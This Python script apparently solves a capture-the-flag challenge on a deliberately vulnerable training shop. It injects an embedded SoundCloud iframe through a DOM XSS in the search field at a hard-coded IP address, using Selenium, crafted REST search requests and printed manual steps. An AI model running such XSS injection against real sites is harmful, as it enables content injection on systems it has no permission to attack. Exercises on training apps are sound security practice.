#!/usr/bin/env python3
"""
Force solve the Bonus Payload challenge
This needs to be triggered through the DOM XSS in search
"""

import requests
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

BASE_URL = "http://155.138.197.128:5000"

def solve_with_selenium():
    """Use Selenium to actually interact with the page"""
    
    print("🎯 Using Selenium to solve Bonus Payload challenge\n")
    print("="*60)
    
    # Setup Chrome in headless mode
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    
    try:
        driver = webdriver.Chrome(options=chrome_options)
        
        # Navigate to the search page
        driver.get(f"{BASE_URL}/#/search")
        time.sleep(3)  # Wait for page to load
        
        # Find the search input
        search_input = driver.find_element(By.CSS_SELECTOR, "input[type='search']")
        
        # The exact SoundCloud payload
        payload = '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>'
        
        # Clear and enter the payload
        search_input.clear()
        search_input.send_keys(payload)
        search_input.send_keys(Keys.RETURN)
        
        print("✅ Payload entered and submitted via Selenium")
        
        # Wait for the XSS to execute
        time.sleep(3)
        
        # Check if we can see the iframe in the DOM
        try:
            iframe = driver.find_element(By.TAG_NAME, "iframe")
            print("✅ SoundCloud iframe injected successfully!")
        except:
            print("⚠️ Iframe not found in DOM")
        
        # Navigate to scoreboard to check
        driver.get(f"{BASE_URL}/#/score-board")
        time.sleep(2)
        
        driver.quit()
        print("\n✨ Challenge should be solved!")
        
    except Exception as e:
        print(f"❌ Selenium error: {e}")
        print("\n📝 Manual method required - see instructions below")

def solve_with_api():
    """Try various API methods to trigger the challenge"""
    
    print("\n🎯 Attempting API-based solutions\n")
    
    session = requests.Session()
    
    # The exact payload from the challenge description
    payload = '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>'
    
    # Try different approaches
    approaches = [
        # Direct search API
        f"{BASE_URL}/rest/products/search?q={payload}",
        # URL encoded
        f"{BASE_URL}/rest/products/search?q=%3Ciframe%20width%3D%22100%25%22%20height%3D%22166%22%20scrolling%3D%22no%22%20frameborder%3D%22no%22%20allow%3D%22autoplay%22%20src%3D%22https%3A%2F%2Fw.soundcloud.com%2Fplayer%2F%3Furl%3Dhttps%253A%2F%2Fapi.soundcloud.com%2Ftracks%2F771984076%26color%3D%2523ff5500%26auto_play%3Dtrue%26hide_related%3Dfalse%26show_comments%3Dtrue%26show_user%3Dtrue%26show_reposts%3Dfalse%26show_teaser%3Dtrue%22%3E%3C%2Fiframe%3E",
    ]
    
    for url in approaches:
        try:
            r = session.get(url)
            print(f"✅ Request sent: {url[:50]}...")
        except:
            pass
    
    # Also try to navigate directly
    try:
        # This should trigger the DOM XSS
        r = session.get(f"{BASE_URL}/#/search?q={payload}")
        print("✅ Direct navigation with payload")
    except:
        pass

def main():
    print("\n" + "="*60)
    print("🎁 BONUS PAYLOAD CHALLENGE SOLVER")
    print("="*60 + "\n")
    
    # Try API method first
    solve_with_api()
    
    print("\n" + "="*60)
    print("📋 MANUAL SOLUTION REQUIRED:")
    print("="*60)
    print("\nThe challenge needs the payload to be entered directly in the browser.")
    print("\n1. Open your browser to: http://155.138.197.128:5000/#/search")
    print("\n2. Copy this ENTIRE payload (select all the text between the dashes):")
    print("-" * 60)
    print('<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>')
    print("-" * 60)
    print("\n3. Paste it into the search box")
    print("\n4. Press Enter")
    print("\n5. You should see/hear the SoundCloud player appear")
    print("\n6. Check scoreboard: http://155.138.197.128:5000/#/score-board")
    print("\n💡 The challenge registers when the SoundCloud iframe is successfully")
    print("   injected through the DOM XSS vulnerability in the search function.")
    print("="*60)

if __name__ == "__main__":
    main()
    
    # Try Selenium if available
    try:
        import selenium
        print("\n🤖 Attempting automated solution with Selenium...")
        solve_with_selenium()
    except ImportError:
        print("\n⚠️ Selenium not installed. Use manual method above.")